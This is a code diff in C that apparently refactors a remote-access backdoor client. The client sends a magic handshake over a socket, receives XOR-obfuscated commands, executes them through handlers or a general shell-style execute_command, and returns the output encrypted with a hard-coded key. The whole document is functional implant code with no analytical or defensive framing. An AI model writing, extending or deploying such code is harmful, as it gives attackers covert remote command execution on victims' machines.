@@ -5,10 +5,17 @@ int sock = 0;
 command_t *commands;
 unsigned int commands_len;
 
-void crypt(char* data, char* key, unsigned int data_size, unsigned int key_size) {
+const uint8_t encryption_key[KEY_LEN] = ENCRYPTION_KEY;
+
+char *crypt(char* data, char* key, unsigned int data_size, unsigned int key_size) {
+
+	char* res = (char*)malloc(data_size);
+
 	for(int i = 0; i < data_size; i++) {
-		data[i] ^= key[i % key_size];
+		res[i] = data[i] ^ key[i % key_size];
 	}
+
+	return res;
 }
 
 int connection_initialize() {
@@ -33,8 +40,28 @@ int connection_initialize() {
 	return TRUE;
 }
 
-int send_data(char *data, unsigned int len) {
-	return send(sock, (const char *)data, len, 0);
+char* pop_data(char *data, unsigned int len) {
+
+	char dt[len];
+
+	recv(sock, dt, len, 0);
+
+	return crypt(dt, encryption_key, len, KEY_LEN);
+}
+
+int send_data(char *data, unsigned int len, boolean use_crypt) {
+
+	char dt[len];
+
+	if(use_crypt) {
+		char* cr = crypt(data, encryption_key, len, KEY_LEN);
+		memcpy(dt, cr, len);
+		free(cr);
+	} else {
+		memcpy(dt, data, len);
+	}
+
+	return send(sock, (const char *)dt, len, 0);
 }
 
 void register_command(const char* command, command_callback_t handler) {
@@ -59,8 +86,7 @@ void init_commands() {
 
 int main() {
 
-	const uint8_t magic[5] = MAGIC;
-	const uint8_t encryption_key[6] = ENCRYPTION_KEY;
+	const uint8_t magic[MAGIC_LEN] = MAGIC;
 
 	init_commands();
 
@@ -70,7 +96,7 @@ int main() {
 
 	uint8_t response = 0;
 
-	send_data((char*)magic, 5);
+	send_data((char*)magic, MAGIC_LEN, FALSE);
 
 	recv(sock, &response, 1, 0);
 
@@ -89,7 +115,7 @@ int main() {
 		char command[4096];
 		recv(sock, command, 4096, 0);
 
-		crypt(command, encryption_key, 4096, 6);
+		char* rcommand = crypt(command, encryption_key, 4096, KEY_LEN);
 
 		unsigned int commands_done = 0;
 
@@ -97,7 +123,7 @@ int main() {
 
 			command_t cmd = commands[c];
 
-			if(strcmp(cmd.command, command) == 0) {
+			if(strcmp(cmd.command, rcommand) == 0) {
 				
 				cmd.callback(result, sock);
 				commands_done++;
@@ -108,10 +134,12 @@ int main() {
 		}
 
 		if(commands_done == 0)
-			execute_command((const char*)command, result);
+			execute_command((const char*)rcommand, result);
 
-		crypt(result, encryption_key, strlen(result), 6);
-		send_data(result, strlen(result));
+	//	crypt(result, encryption_key, strlen(result), KEY_LEN);
+		send_data(result, strlen(result), TRUE);
+
+		free(rcommand);
 
 		memset(result, 0, COMMAND_BUFFER_SIZE);
 	}
